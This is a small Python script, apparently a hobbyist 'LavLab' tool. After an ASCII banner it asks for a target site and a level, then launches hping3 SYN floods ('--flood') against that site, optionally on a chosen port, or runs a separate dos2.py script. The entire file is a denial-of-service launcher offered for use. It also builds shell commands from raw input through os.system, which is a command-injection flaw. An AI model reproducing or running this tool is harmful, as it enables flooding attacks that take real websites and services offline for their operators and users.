import urllib.request  as urllib2
import re
import sys,os
import random



Mainlogo = """\033[0m
_ (              (
 )\ )           )\ )         )
(()/(    )  )  (()/(    ) ( /(
 /(_))( /( /((  /(_))( /( )\())
(_))  )(_)|_))\(_))  )(_)|(_)\
| |  ((_)__)((_) |  ((_)_| |(_)
| |__/ _` \ V /| |__/ _` | '_ \
|____\__,_|\_/ |____\__,_|_.__/

            ~Tools by- LavSrkari

\033[91m"""




print(Mainlogo)

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

def Dos():
        print('Enter site:')
        site = input(B+'LavLab»Dos»'+E)
        print('''Enter level:
                1) High dos
                2) Dos port
                3) Low dos''')
        level = int(input(B+'LavLab»Dos»Level»'+E))
        if level == 1:
                os.system('hping3 -S -P --flood -V '+site)
        if level == 2:
                port = input(B+'Hunner»Dos»Level»Port»'+E)
                os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
        if level == 3:
                os.system('python3 dos2.py '+site)
Dos()
